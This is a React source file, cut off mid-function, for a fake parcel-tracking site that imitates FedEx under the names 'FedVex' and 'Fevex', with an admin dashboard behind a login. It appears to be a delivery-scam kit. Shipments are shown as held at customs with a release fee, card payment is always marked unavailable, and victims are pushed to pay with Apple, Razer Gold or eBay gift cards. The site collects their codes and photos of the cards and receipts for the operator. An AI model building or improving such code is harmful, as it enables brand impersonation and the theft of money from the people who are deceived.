import React, { useEffect, useState } from "react";
import ReactDOM from "react-dom/client";
import { supabase } from "./supabase";
import "./styles.css";

type Status =
  | "LABEL_CREATED"
  | "PICKED_UP"
  | "IN_TRANSIT"
  | "HELD"
  | "OUT_FOR_DELIVERY"
  | "DELIVERED";

type HoldStatus = "OPEN" | "PENDING_REVIEW" | "RESOLVED" | "REJECTED";
type HoldReason =
  | "CUSTOMS_HOLD"
  | "ADDRESS_VERIFICATION"
  | "SECURITY_REVIEW"
  | "PAYMENT_PENDING"
  | "OTHER";

type GiftCardType = "apple" | "razer_gold" | "ebay";

type TrackingEvent = {
  id: string;
  code: Status;
  description: string;
  facility: string;
  city: string;
  country: string;
  occurredAt: string;
};

type HoldRequest = {
  id: string;
  reasonCode: HoldReason;
  description: string;
  status: HoldStatus;
  releaseAmount: number;
  paySectionEnabled: boolean;
};

type ReceiptSubmission = {
  id: string;
  imageDataUrl: string;
  fileName: string;
  submittedAt: string;
};

type GiftCardSubmission = {
  id: string;
  cardType: GiftCardType;
  cardCode: string;
  cardImageDataUrl: string;
  cardImageFileName: string;
  receiptImageDataUrl: string;
  receiptFileName: string;
  submittedAt: string;
};

type Shipment = {
  id: string;
  trackingNumber: string;
  destinationCity: string;
  destinationCountry: string;
  currentStatus: Status;
  packageImageUrl?: string;
  createdAt: string;
  updatedAt: string;
  events: TrackingEvent[];
  holdRequest: HoldRequest | null;
  receiptSubmission: ReceiptSubmission | null;
  giftCardSubmissions: GiftCardSubmission[];
};

type SupabaseShipmentRow = {
  id: string;
  tracking_number: string;
  destination_city: string | null;
  destination_country: string | null;
  current_status: Status;
  package_image_url: string | null;
  created_at: string;
  updated_at: string;
  events?: TrackingEvent[] | null;
  hold_request?: HoldRequest | null;
  receipt_submission?: ReceiptSubmission | null;
  gift_card_submissions?: GiftCardSubmission[] | null;
};

const STORAGE_KEY = "fedvex.shipments.v1";
const PACKAGE_IMAGES_BUCKET = "package-images";
const navItems = ["Shipping", "Tracking", "Design & Print", "Locations", "Support"];
const statusFlow: Status[] = [
  "LABEL_CREATED",
  "PICKED_UP",
  "IN_TRANSIT",
  "HELD",
  "OUT_FOR_DELIVERY",
  "DELIVERED",
];

const statusLabels: Record<Status, string> = {
  LABEL_CREATED: "Label created",
  PICKED_UP: "Picked up",
  IN_TRANSIT: "In transit",
  HELD: "Held",
  OUT_FOR_DELIVERY: "Out for delivery",
  DELIVERED: "Delivered",
};

const giftCardLabels: Record<GiftCardType, string> = {
  apple: "Apple Gift Card",
  razer_gold: "Razer Gold",
  ebay: "eBay Gift Card",
};

const giftCardCodeExamples: Record<GiftCardType, string> = {
  apple: "Enter 16-digit code (e.g., XXXX-XXXX-XXXX-XXXX)",
  razer_gold: "Enter PIN code (e.g., RZR-XXXX-XXXX-XXXX)",
  ebay: "Enter code (e.g., EBAY-XXXX-XXXX-XXXX)",
};

const actionItems = [
  ["person-icon", "Drop off a package"],
  ["truck-small-icon", "Redirect a package"],
  ["store-icon", "Store hours and services"],
  ["alert-icon", "Service alerts"],
  ["return-icon", "Return a package"],
];

const businessRows = [
  {
    imageClass: "photo-desk",
    title: "Increase productivity with every package",
    copy: "Simplify daily shipping tasks with automated Fedex tools and integrations. They help you save time and improve efficiency.",
    label: "Manage deliveries",
  },
  {
    imageClass: "photo-air",
    title: "Go far with end-to-end freight support",
    copy: "Reach customers in 130+ international destinations with air freight options and end-to-end visibility.",
    label: "Ship air freight",
  },
  {
    imageClass: "photo-client",
    title: "Unlocking added value is easy",
    copy: "With Fedex Rewards, you earn perks for the shipping you do. Start by opening a Fevex account.",
    label: "Open a free account",
  },
];

function nowIso() {
  return new Date().toISOString();
}

function makeId(prefix: string) {
  return `${prefix}-${crypto.randomUUID()}`;
}

/** Extract the UUID part from a prefixed ID like "shipment-uuid" */
function extractUuid(prefixedId: string): string {
  return prefixedId.startsWith("shipment-") ? prefixedId.slice("shipment-".length) : prefixedId;
}

function normalizeTracking(value: string) {
  return value.trim().toUpperCase();
}

function createEvent(code: Status, shipment: Pick<Shipment, "id" | "destinationCity" | "destinationCountry">): TrackingEvent {
  return {
    id: makeId("event"),
    code,
    description: `${statusLabels[code]} at Fedex network facility.`,
    facility: "Fedex Distribution Center",
    city: shipment.destinationCity || "Memphis",
    country: shipment.destinationCountry || "United States",
    occurredAt: nowIso(),
  };
}

function createBlankEvent(code: Status, shipment: Pick<Shipment, "id" | "destinationCity" | "destinationCountry">): TrackingEvent {
  return {
    id: makeId("event"),
    code,
    description: statusLabels[code],
    facility: "Fedex Distribution Center",
    city: shipment.destinationCity || "Los Angeles",
    country: shipment.destinationCountry || "United States",
    occurredAt: nowIso(),
  };
}

function seedShipments(): Shipment[] {
  const base: Shipment = {
    id: makeId("shipment"),
    trackingNumber: "FVX123456789",
    destinationCity: "Los Angeles",
    destinationCountry: "United States",
    currentStatus: "HELD",
    packageImageUrl: "",
    createdAt: nowIso(),
    updatedAt: nowIso(),
    events: [],
    holdRequest: {
      id: makeId("hold"),
      reasonCode: "CUSTOMS_HOLD",
      description: "Shipment is being reviewed at a Fedex facility before release.",
      status: "OPEN",
      releaseAmount: 25,
      paySectionEnabled: true,
    },
    receiptSubmission: null,
    giftCardSubmissions: [],
  };

  base.events = [
    createEvent("LABEL_CREATED", base),
    createEvent("PICKED_UP", base),
    createEvent("IN_TRANSIT", base),
    createEvent("HELD", base),
  ];
  return [base];
}

function loadShipments(): Shipment[] {
  const raw = localStorage.getItem(STORAGE_KEY);
  if (!raw) {
    const seeded = seedShipments();
    localStorage.setItem(STORAGE_KEY, JSON.stringify(seeded));
    return seeded;
  }

  try {
    return (JSON.parse(raw) as Shipment[]).map((shipment) => ({
      ...shipment,
      packageImageUrl: shipment.packageImageUrl ?? "",
      giftCardSubmissions: shipment.giftCardSubmissions ?? [],
    }));
  } catch {
    const seeded = seedShipments();
    localStorage.setItem(STORAGE_KEY, JSON.stringify(seeded));
    return seeded;
  }
}

function supabaseRowToShipment(row: SupabaseShipmentRow): Shipment {
  return {
    id: row.id.startsWith("shipment-") ? row.id : `shipment-${row.id}`,
    trackingNumber: row.tracking_number,
    destinationCity: row.destination_city ?? "",
    destinationCountry: row.destination_country ?? "",
    currentStatus: row.current_status,
    packageImageUrl: row.package_image_url ?? "",
    createdAt: row.created_at,
    updatedAt: row.updated_at,
    events: row.events ?? [],
    holdRequest: row.hold_request ?? null,
    receiptSubmission: row.receipt_submission ?? null,
    giftCardSubmissions: row.gift_card_submissions ?? [],
  };
}

function shipmentToSupabaseRow(shipment: Shipment) {
  return {
    id: extractUuid(shipment.id),
    tracking_number: normalizeTracking(shipment.trackingNumber),
    destination_city: shipment.destinationCity,
    destination_country: shipment.destinationCountry,
    current_status: shipment.currentStatus,
    package_image_url: shipment.packageImageUrl || null,
    created_at: shipment.createdAt,
    updated_at: shipment.updatedAt,
    events: shipment.events,
    hold_request: shipment.holdRequest,
  };
}

async function uploadPackageImage(shipment: Shipment): Promise<Shipment> {
  if (!shipment.packageImageUrl?.startsWith("data:image/")) return shipment;

  const image = await fetch(shipment.packageImageUrl).then((response) => response.blob());
  const extension = image.type.split("/")[1]?.replace("jpeg", "jpg") || "jpg";
  const imagePath = `${extractUuid(shipment.id)}/package.${extension}`;
  const { error } = await supabase.storage
    .from(PACKAGE_IMAGES_BUCKET)
    .upload(imagePath, image, { contentType: image.type, upsert: true });

  if (error) throw error;
  const { data } = supabase.storage.from(PACKAGE_IMAGES_BUCKET).getPublicUrl(imagePath);
  return { ...shipment, packageImageUrl: data.publicUrl };
}

async function fetchShipmentFromSupabase(trackingNumber: string): Promise<Shipment | null> {
  const { data, error } = await supabase
    .from("shipments")
    .select("*")
    .eq("tracking_number", trackingNumber)
    .maybeSingle();

  if (error) throw error;
  if (!data) return null;

  return supabaseRowToShipment(data as SupabaseShipmentRow);
}

async function fetchShipmentsFromSupabase(): Promise<Shipment[]> {
  const { data, error } = await supabase.from("shipments").select("*").order("updated_at", { ascending: false });
  if (error) throw error;
  return (data as SupabaseShipmentRow[]).map(supabaseRowToShipment);
}

async function createShipmentInSupabase(shipment: Shipment): Promise<Shipment> {
  const shipmentWithImage = await uploadPackageImage(shipment);
  const { data, error } = await supabase
    .from("shipments")
    .insert(shipmentToSupabaseRow(shipmentWithImage))
    .select("*")
    .single();
  if (error) throw error;
  return supabaseRowToShipment(data as SupabaseShipmentRow);
}

async function updateShipmentInSupabase(shipment: Shipment): Promise<Shipment> {
  const shipmentWithImage = await uploadPackageImage(shipment);
  const { data, error } = await supabase
    .from("shipments")
    .update(shipmentToSupabaseRow(shipmentWithImage))
    .eq("id", extractUuid(shipment.id))
    .select("*")
    .single();
  if (error) throw error;
  return supabaseRowToShipment(data as SupabaseShipmentRow);
}

async function deleteShipmentFromSupabase(shipmentId: string): Promise<void> {
  const id = extractUuid(shipmentId);
  const { error: imageError } = await supabase.storage.from(PACKAGE_IMAGES_BUCKET).remove([
    `${id}/package.jpg`,
    `${id}/package.png`,
    `${id}/package.gif`,
  ]);
  if (imageError) console.warn("Unable to remove package image:", imageError);

  const { error } = await supabase.from("shipments").delete().eq("id", id);
  if (error) throw error;
}

function saveShipments(shipments: Shipment[]) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(shipments));
}

function getValidNextStatuses(shipment: Shipment): Status[] {
  if (shipment.currentStatus === "DELIVERED") return [];
  if (shipment.currentStatus === "IN_TRANSIT") return ["HELD", "OUT_FOR_DELIVERY"];
  if (shipment.currentStatus === "HELD") return ["OUT_FOR_DELIVERY"];

  const currentIndex = statusFlow.indexOf(shipment.currentStatus);
  const next = statusFlow[currentIndex + 1];
  return next ? [next] : [];
}

function formatDate(value: string) {
  return new Intl.DateTimeFormat("en-US", {
    dateStyle: "medium",
    timeStyle: "short",
  }).format(new Date(value));
}

function Header() {
  return (
    <header className="site-header" aria-label="Primary navigation">
      <div className="header-inner">
        {/* LOGO_PLACEHOLDER */}
        <div className="brand" aria-label="Fedex">
          <span>Fed</span>
          <span>ex</span>
        </div>
        <nav className="nav-links" aria-label="Main sections">
          {navItems.map((item) => (
            <span className="nav-link" key={item}>
              {item}
              <span className="chevron" aria-hidden="true">
                v
              </span>
            </span>
          ))}
        </nav>
        <div className="account-strip" aria-label="Account and search preview">
          <span>Sign Up or Log In</span>
          <span className="circle-icon" aria-hidden="true" />
          <span className="search-icon" aria-hidden="true" />
        </div>
      </div>
    </header>
  );
}

function TrackingSearch({ onTrack }: { onTrack: (trackingNumber: string) => void }) {
  const [trackingNumber, setTrackingNumber] = useState("");

  return (
    <form
      className="tracking-preview"
      onSubmit={(event) => {
        event.preventDefault();
        onTrack(trackingNumber);
      }}
    >
      <input
        className="tracking-field"
        aria-label="Tracking ID"
        placeholder="Tracking ID"
        value={trackingNumber}
        onChange={(event) => setTrackingNumber(event.target.value)}
      />
      <button className="tracking-cta" type="submit">
        <span>Track</span>
        <span aria-hidden="true">-&gt;</span>
      </button>
    </form>
  );
}

function ServiceTiles() {
  return (
    <section className="service-tiles" aria-label="Featured services">
      <div className="service-tile">
        <span className="tile-icon box-icon" aria-hidden="true" />
        <span>Rate & Ship</span>
      </div>
      <div className="service-tile active-tile">
        <span className="tile-icon track-icon" aria-hidden="true" />
        <span>Track</span>
      </div>
      <div className="service-tile">
        <span className="tile-icon pin-icon" aria-hidden="true" />
        <span>Locations</span>
      </div>
    </section>
  );
}

function HomePage() {
  const [shipments, setShipments] = useState<Shipment[]>(() => loadShipments());
  const [query, setQuery] = useState("");
  const [searched, setSearched] = useState(false);
  const [isSearching, setIsSearching] = useState(false);
  const result = shipments.find((shipment) => shipment.trackingNumber === query);

  async function runTrackingSearch(trackingNumber: string) {
    const normalized = normalizeTracking(trackingNumber);
    const latestShipments = loadShipments();
    setShipments(latestShipments);
    setQuery(normalized);
    setSearched(Boolean(normalized));

    if (normalized && !latestShipments.some((shipment) => shipment.trackingNumber === normalized)) {
      setIsSearching(true);
      try {
        const remoteShipment = await fetchShipmentFromSupabase(normalized);
        if (remoteShipment) {
          const nextShipments = [...latestShipments, remoteShipment];
          setShipments(nextShipments);
          saveShipments(nextShipments);
        }
      } catch (error) {
        console.error("Unable to fetch shipment from Supabase:", error);
      } finally {
        setIsSearching(false);
      }
    } else {
      setIsSearching(false);
    }

    window.setTimeout(() => {
      document.getElementById("tracking-results")?.scrollIntoView({ behavior: "smooth", block: "start" });
    }, 50);
  }

  function updateShipment(updated: Shipment) {
    const next = shipments.map((shipment) =>
      shipment.id === updated.id ? { ...updated, updatedAt: nowIso() } : shipment,
    );
    setShipments(next);
    saveShipments(next);
  }

  return (
    <main className="page-shell">
      <Header />
      <section className="hero" aria-label="Fedex shipping landing page">
        <div className="hero-overlay" />
        <div className="hero-content">
          <h1>Ship, manage, track, deliver</h1>
          <ServiceTiles />
          <TrackingSearch onTrack={runTrackingSearch} />
        </div>
      </section>
      {searched && (
        <section className="tracking-results" id="tracking-results">
          {isSearching ? (
            <div className="not-found">Searching for shipment...</div>
          ) : result ? (
            <ShipmentCard shipment={result} onUpdate={updateShipment} />
          ) : (
            <div className="not-found">No shipment data available for the provided tracking number.</div>
          )}
        </section>
      )}
      <MarketingPage />
    </main>
  );
}

function ShipmentCard({ shipment, onUpdate }: { shipment: Shipment; onUpdate: (shipment: Shipment) => void }) {
  return (
    <article className="shipment-card">
      <div className="shipment-header">
        <div>
          <span className="eyebrow">Tracking number</span>
          <h2>{shipment.trackingNumber}</h2>
        </div>
        <span className={`status-pill ${shipment.currentStatus.toLowerCase().replace(/_/g, "-")}`}>
          {statusLabels[shipment.currentStatus]}
        </span>
      </div>
      <p className="destination">
        Destination: {shipment.destinationCity}, {shipment.destinationCountry}
      </p>
      {shipment.packageImageUrl && (
        <img alt={`Package for ${shipment.trackingNumber}`} className="package-photo" src={shipment.packageImageUrl} />
      )}
      <Timeline shipment={shipment} />
      {shipment.currentStatus === "HELD" && shipment.holdRequest ? (
        <HoldPanel shipment={shipment} onUpdate={onUpdate} />
      ) : (
        <a className="support-link" href="mailto:support@example.test">
          Contact FedVex Support
        </a>
      )}
    </article>
  );
}

function Timeline({ shipment }: { shipment: Shipment }) {
  const currentIndex = statusFlow.indexOf(shipment.currentStatus);
  const visibleFlow = shipment.holdRequest ? statusFlow : statusFlow.filter((status) => status !== "HELD");

  return (
    <ol className="timeline">
      {visibleFlow.map((status) => {
        const flowIndex = statusFlow.indexOf(status);
        const isCompleted = flowIndex < currentIndex;
        const isCurrent = status === shipment.currentStatus;
        const isHeld = status === "HELD";
        const event = shipment.events.find((item) => item.code === status);
        return (
          <li
            className={`timeline-step ${isCompleted ? "completed" : ""} ${isCurrent ? "current" : ""} ${
              isHeld ? "hold-step" : ""
            }`}
            key={status}
          >
            <span className="timeline-dot">{isHeld ? "!" : isCompleted ? "✓" : ""}</span>
            <div>
              <strong>{statusLabels[status]}</strong>
              <span>{event ? `${event.facility} - ${event.city}, ${event.country}` : "Pending"}</span>
              {event && <small>{formatDate(event.occurredAt)}</small>}
            </div>
          </li>
        );
      })}
    </ol>
  );
}

function HoldPanel({ shipment, onUpdate }: { shipment: Shipment; onUpdate: (shipment: Shipment) => void }) {
  const hold = shipment.holdRequest!;

  return (
    <section className="hold-panel">
      <h3>Shipment hold review</h3>
      {shipment.packageImageUrl && (
        <img alt={`Held package ${shipment.trackingNumber}`} className="hold-package-photo" src={shipment.packageImageUrl} />
      )}
      <p>
        <strong>{hold.reasonCode.replace(/_/g, " ")}</strong>: {hold.description}
      </p>
      {hold.releaseAmount > 0 && <p className="release-amount">${hold.releaseAmount.toFixed(2)}</p>}
      {hold.releaseAmount > 0 && hold.paySectionEnabled && (
        <button
          className="pay-button"
          type="button"
          onClick={() => window.location.assign(`/release-payment?tracking=${encodeURIComponent(shipment.trackingNumber)}`)}
        >
          Pay Release Amount
        </button>
      )}
    </section>
  );
}

// ============================================
// PaySection — with error display + localStorage fallback
// ============================================
function PaySection({
  shipment,
  standalone = false,
}: {
  shipment: Shipment;
  standalone?: boolean;
}) {
  const [expanded, setExpanded] = useState(standalone);
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [submitted, setSubmitted] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Gift card form state — using File objects
  const [selectedGiftCard, setSelectedGiftCard] = useState<GiftCardType | null>(null);
  const [giftCardCode, setGiftCardCode] = useState("");
  const [giftCardFile, setGiftCardFile] = useState<File | null>(null);
  const [giftCardPreview, setGiftCardPreview] = useState("");
  const [receiptFile, setReceiptFile] = useState<File | null>(null);
  const [receiptPreview, setReceiptPreview] = useState("");

  function resetGiftCardForm() {
    setSelectedGiftCard(null);
    setGiftCardCode("");
    setGiftCardFile(null);
    setGiftCardPreview("");
    setReceiptFile(null);
    setReceiptPreview("");
  }

  async function handleGiftCardSubmit() {
    // Validate
    if (!selectedGiftCard) { setErrorMessage("Please select a gift card type."); return; }
    if (!giftCardCode.trim()) { setErrorMessage("Please enter the gift card code."); return; }
    if (!giftCardFile) { setErrorMessage("Please upload an image of the gift card."); return; }
    if (!receiptFile) { setErrorMessage("Please upload an image of the receipt."); return; }

    setErrorMessage(null);
    setIsSubmitting(true);

    try {
      // Extract the actual UUID from the prefixed ID
      const shipmentUuid = extractUuid(shipment.id);

      // 1. Upload gift card image
      const cardFileName = `${crypto.randomUUID()}-${giftCardFile.name}`;
      const { error: cardUploadError } = await supabase.storage
        .from('gift_card_images')
        .upload(cardFileName, giftCardFile, { cacheControl: "3600", upsert: false });

      if (cardUploadError) {
        setErrorMessage(`Card image upload failed: ${cardUploadError.message}`);
        console.error('Card upload error:', cardUploadError);
        setIsSubmitting(false);
        return;
      }

      // 2. Upload receipt image
      const receiptFileName = `${crypto.randomUUID()}-${receiptFile.name}`;
      const { error: receiptUploadError } = await supabase.storage
        .from('receipts')
        .upload(receiptFileName, receiptFile, { cacheControl: "3600", upsert: false });

      if (receiptUploadError) {
        setErrorMessage(`Receipt image upload failed: ${receiptUploadError.message}`);
        console.error('Receipt upload error:', receiptUploadError);
        setIsSubmitting(false);
        return;
      }

      // 3. Get public URLs
      const { data: cardUrlData } = supabase.storage
        .from('gift_card_images')
        .getPublicUrl(cardFileName);

      const { data: receiptUrlData } = supabase.storage
        .from('receipts')
        .getPublicUrl(receiptFileName);

      // 4. Insert into gift_card_submissions
      const { error: insertError } = await supabase
        .from('gift_card_submissions')
        .insert({
          shipment_id: shipmentUuid,
          card_type: selectedGiftCard,
          card_code: giftCardCode.trim(),
          card_image_url: cardUrlData.publicUrl,
          receipt_image_url: receiptUrlData.publicUrl,
          submitted_at: new Date().toISOString(),
        });

      if (insertError) {
        setErrorMessage(`Database insert failed: ${insertError.message}`);
        console.error('Insert error:', insertError);
        setIsSubmitting(false);
        return;
      }

      // 5. Also save to localStorage as fallback so admin can see it
      try {
        const shipments = loadShipments();
        const idx = shipments.findIndex((s) => s.id === shipment.id);
        if (idx !== -1) {
          shipments[idx].giftCardSubmissions.push({
            id: makeId("giftcard"),
            cardType: selectedGiftCard,
            cardCode: giftCardCode.trim(),
            cardImageDataUrl: cardUrlData.publicUrl,
            cardImageFileName: giftCardFile.name,
            receiptImageDataUrl: receiptUrlData.publicUrl,
            receiptFileName: receiptFile.name,
            submittedAt: new Date().toISOString(),
          });
          saveShipments(shipments);
        }
      } catch (localErr) {
        console.warn('Failed to save to localStorage:', localErr);
      }

      // Success
      setSubmitted(true);
      resetGiftCardForm();
    } catch (err: any) {
      setErrorMessage(`Unexpected error: ${err.message ?? 'Unknown error'}`);
      console.error('Submit error:', err);
    } finally {
      setIsSubmitting(false);
    }
  }

  if (submitted) {
    return (
      <section className="pay-section">
        <p className="receipt-message">
          Payment submitted for review. Your package will be reviewed within 24-48 hours.
        </p>
      </section>
    );
  }

  return (
    <section className="pay-section">
      {!standalone && (
        <button className="pay-button" type="button" onClick={() => setExpanded(!expanded)}>
          {expanded ? "Cancel" : "Pay Release Amount"}
        </button>
      )}

      {expanded && (
        <div className="payment-methods">
          {/* Error banner */}
          {errorMessage && (
            <div style={{ background: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "10px 14px", borderRadius: 4, marginBottom: 12, fontSize: 14 }}>
              <strong>Error:</strong> {errorMessage}
            </div>
          )}

          <div className="payment-method-heading">
            <span className="payment-heading-icon" aria-hidden="true">$</span>
            <div><h4>Select payment method</h4><p>Choose how you would like to pay</p></div>
          </div>

          {/* Debit Card - Unavailable */}
          <div
            className={`payment-method-item ${selectedMethod === "debit" ? "selected" : ""}`}
            onClick={() => setSelectedMethod("debit")}
          >
            <span className="method-icon" aria-hidden="true">▣</span>
            <span className="payment-method-copy"><strong>Debit Card</strong><small>Visa, Mastercard</small></span>
            <span className="payment-method-status unavailable">Unavailable</span>
          </div>

          {/* Credit Card - Unavailable */}
          <div
            className={`payment-method-item ${selectedMethod === "credit" ? "selected" : ""}`}
            onClick={() => setSelectedMethod("credit")}
          >
            <span className="method-icon" aria-hidden="true">◇</span>
            <span className="payment-method-copy"><strong>Credit Card</strong><small>Secure card payment</small></span>
            <span className="payment-method-status unavailable">Unavailable</span>
          </div>

          {/* Gift Card Section */}
          <div className="payment-method-section">
            <h5><span aria-hidden="true">◆</span> Pay with Gift Card</h5>

            <div className="gift-card-options">
              {(["apple", "razer_gold", "ebay"] as GiftCardType[]).map((type) => (
                <div
                  key={type}
                  className={`gift-card-option ${selectedGiftCard === type ? "selected" : ""}`}
                  onClick={() => {
                    setSelectedGiftCard(type);
                    setGiftCardCode("");
                    setGiftCardFile(null);
                    setGiftCardPreview("");
                    setReceiptFile(null);
                    setReceiptPreview("");
                    setErrorMessage(null);
                  }}
                >
                  <span className={`gift-card-symbol ${type}`} aria-hidden="true">
                    {type === "apple" ? "●" : type === "razer_gold" ? "⚡" : "e"}
                  </span>
                  <span>{giftCardLabels[type]}</span>
                  {selectedGiftCard === type && <span className="check-indicator">✓</span>}
                </div>
              ))}
            </div>

            {selectedGiftCard && (
              <div className="gift-card-form">
                <label className="payment-field">
                  <span>Gift Card Code</span>
                  <input
                    placeholder={giftCardCodeExamples[selectedGiftCard]}
                    value={giftCardCode}
                    onChange={(e) => setGiftCardCode(e.target.value)}
                  />
                </label>

                <label className="payment-field upload-field">
                  <span>Upload Gift Card Image</span>
                  <input
                    accept="image/gif,image/jpeg,image/png"
                    type="file"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (!file) return;
                      setGiftCardFile(file);
                      const reader = new FileReader();
                      reader.onload = () => setGiftCardPreview(String(reader.result));
                      reader.readAsDataURL(file);
                    }}
                  />
                </label>
                {giftCardPreview && (
                  <img alt="Gift card" className="payment-preview" src={giftCardPreview} />
                )}

                <label className="payment-field upload-field">
                  <span>Upload Payment Receipt</span>
                  <input
                    accept="image/gif,image/jpeg,image/png"
                    type="file"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (!file) return;
                      setReceiptFile(file);
                      const reader = new FileReader();
                      reader.onload = () => setReceiptPreview(String(reader.result));
                      reader.readAsDataURL(file);
                    }}
                  />
                </label>
                {receiptPreview && (
                  <img alt="Receipt" className="payment-preview" src={receiptPreview} />
                )}

                <button
                  className="submit-receipt"
                  disabled={!giftCardCode.trim() || !giftCardFile || !receiptFile || isSubmitting}
                  type="button"
                  onClick={handleGiftCardSubmit}
                >
                  {isSubmitting ? "Submitting..." : "Submit Payment"}
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </section>
  );
}

function MarketingPage() {
  return (
    <section className="mobile-page" aria-label="Fedex shipping overview">
      <div className="compact-brand-bar">
        <div className="compact-brand">
          <span>Fed</span>
          <span>ex</span>
        </div>
      </div>
      <div className="mobile-content">
        <div className="notice-line">
          <span className="notice-icon" aria-hidden="true">
            i
          </span>
          <span>US Supreme Court Tariff Update. See how this may impact you.</span>
          <strong>More info</strong>
        </div>
        <section className="action-grid" aria-label="Shipping actions preview">
          {actionItems.map(([icon, label]) => (
            <div className="action-item" key={label}>
              <span className={`action-icon ${icon}`} aria-hidden="true" />
              <span>{label}</span>
            </div>
          ))}
        </section>
        <section className="why-card">
          <div className="why-copy">
            <h2>Why ship with Fedex?</h2>
            <div className="why-columns">
              <p>
                <strong>Innovative solutions for reliability & speed</strong>
                Whether it is across states or worldwide, we prioritize the secure and swift arrival
                of your shipments.
              </p>
              <p>
                <strong>Premium shipping at professional rates</strong>
                Whether you are selling online or moving freight, Fedex keeps your shipping
                organized.
              </p>
            </div>
            <div className="story-grid">
              <div className="story-image photo-office" />
              <div>
                <strong>We ship everywhere.</strong>
                <span> Discover our reach</span>
              </div>
              <div className="story-image photo-boxes" />
              <div>
                <strong>New overnight flat rates, less than the cost of nice joe</strong>
                <span> [site 1]</span>
              </div>
            </div>
          </div>
          <div className="courier-panel">
            <div className="courier-photo" />
            <h3>Premium shipping at professional rates</h3>
            <p>
              When you need reliable delivery and careful handling, trust Fedex to get your items
              where they need to go on time.
            </p>
            <span>Learn about Fedex One Rate [site 2]</span>
          </div>
          <div className="orange-label">Start shipping now</div>
        </section>
        <section className="summer-section">
          <h2>Flexible deliveries to fit your summer plans</h2>
          <div className="summer-grid">
            <div className="summer-card photo-road" />
            <div className="summer-card photo-package" />
            <div className="summer-card photo-phone" />
          </div>
        </section>
        <section className="trade-card">
          <div>
            <h2>Tariffs, trade news, and global shipping</h2>
            <h3>Stay on top of tariffs and trade news</h3>
            <p>
              Find helpful tools for international shipping. Stay informed about global clearance
              requirements, tariff policy changes, and global logistics updates.
            </p>
            <strong>Navigate global shipping [site 3]</strong>
          </div>
          <div className="port-photo" />
        </section>
        <section className="business-section">
          <h2>Shipping that moves your business forward</h2>
          <div className="business-list">
            {businessRows.map((row) => (
              <article className="business-row" key={row.title}>
                <div className={`business-image ${row.imageClass}`} />
                <div>
                  <h3>{row.title}</h3>
                  <p>{row.copy}</p>
                  <strong>{row.label}</strong>
                </div>
              </article>
            ))}
          </div>
        </section>
        <section className="guarantee-section">
          <h2>Money-back guarantee</h2>
          <p>
            We offer a money-back guarantee for select services. This guarantee may be suspended,
            modified, or revoked. Please check our guarantee terms for the latest status.
          </p>
          <p>
            <strong>*For details, please see Rewards Terms and Conditions.</strong>
          </p>
          <small>
            *See service areas for restrictions.
            <br />
            **See flat rate conditions.
          </small>
        </section>
        <FooterPreview />
      </div>
    </section>
  );
}

function FooterPreview() {
  return (
    <footer className="footer-preview">
      <div className="footer-columns">
        <div>
          <h4>Our company</h4>
          <span>About Fedex</span>
          <span>Our Portfolio</span>
          <span>Investor Relations</span>
          <span>Careers</span>
          <span>Transportation Contracting</span>
          <span>Open shipments</span>
        </div>
        <div>
          <h4>Resources from us</h4>
          <span>Logistics Solutions</span>
          <span>Developer Portal</span>
          <span>Small Business Center</span>
          <span>Compatible Services</span>
        </div>
        <div>
          <h4>Language</h4>
          <span className="locale">United States</span>
          <span className="select-preview">English</span>
        </div>
      </div>
      <div className="social-row">
        <strong>Follow Fevex</strong>
        <span>f</span>
        <span>x</span>
        <span>in</span>
        <span>yt</span>
        <span>ig</span>
      </div>
      <div className="legal-strip">
        <span>© Shipping & Logistics Co. 1995-2026</span>
        <span>Site Map | Terms of Use | Privacy & Security | AI Choices</span>
      </div>
      <div className="chat-bubble" aria-hidden="true">
        □
      </div>
    </footer>
  );
}

function AdminLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  return (
    <main className="admin-page">
      <section className="admin-login-card">
        <h1>FedVex Admin</h1>
        <p>Sign in with your authorized Supabase admin account.</p>
        <form
          onSubmit={async (event) => {
            event.preventDefault();
            setError("");
            setIsSubmitting(true);
            const { error: signInError } = await supabase.auth.signInWithPassword({ email, password });
            setIsSubmitting(false);
            if (!signInError) {
              window.location.href = "/admin";
            } else {
              setError(signInError.message);
            }
          }}
        >
          <input
            aria-label="Email"
            autoComplete="username"
            placeholder="Admin email"
            type="email"
            value={email}
            onChange={(event) => setEmail(event.target.value)}
          />
          <input
            aria-label="Password"
            autoComplete="current-password"
            placeholder="Password"
            type="password"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
          />
          <button disabled={isSubmitting} type="submit">{isSubmitting ? "Signing in..." : "Log In"}</button>
          {error && <strong className="admin-error">{error}</strong>}
        </form>
      </section>
    </main>
  );
}

function AdminDashboard() {
  const [shipments, setShipments] = useState<Shipment[]>(() => loadShipments());
  const [selectedTracking, setSelectedTracking] = useState<string>("");
  const [isSyncing, setIsSyncing] = useState(true);
  const [syncError, setSyncError] = useState("");
  const selected = shipments.find((shipment) => shipment.trackingNumber === selectedTracking) ?? shipments[0];

  useEffect(() => {
    if (!selectedTracking && shipments[0]) setSelectedTracking(shipments[0].trackingNumber);
  }, [selectedTracking, shipments]);

  useEffect(() => {
    let cancelled = false;
    async function loadRemoteShipments() {
      try {
        const remoteShipments = await fetchShipmentsFromSupabase();
        if (cancelled) return;
        persist(remoteShipments);
        setSelectedTracking(remoteShipments[0]?.trackingNumber ?? "");
      } catch (error) {
        if (!cancelled) setSyncError(error instanceof Error ? error.message : "Unable to load shipments from Supabase.");
      } finally {
        if (!cancelled) setIsSyncing(false);
      }
    }
    void loadRemoteShipments();
    return () => { cancelled = true; };
  }, []);

  function persist(next: Shipment[]) {
    setShipments(next);
    saveShipments(next);
  }

  async function updateShipment(updated: Shipment) {
    const cleaned = {
      ...updated,
      trackingNumber: normalizeTracking(updated.trackingNumber),
      updatedAt: nowIso(),
    };
    setIsSyncing(true);
    setSyncError("");
    try {
      const saved = await updateShipmentInSupabase(cleaned);
      const exists = shipments.some((shipment) => shipment.id === saved.id);
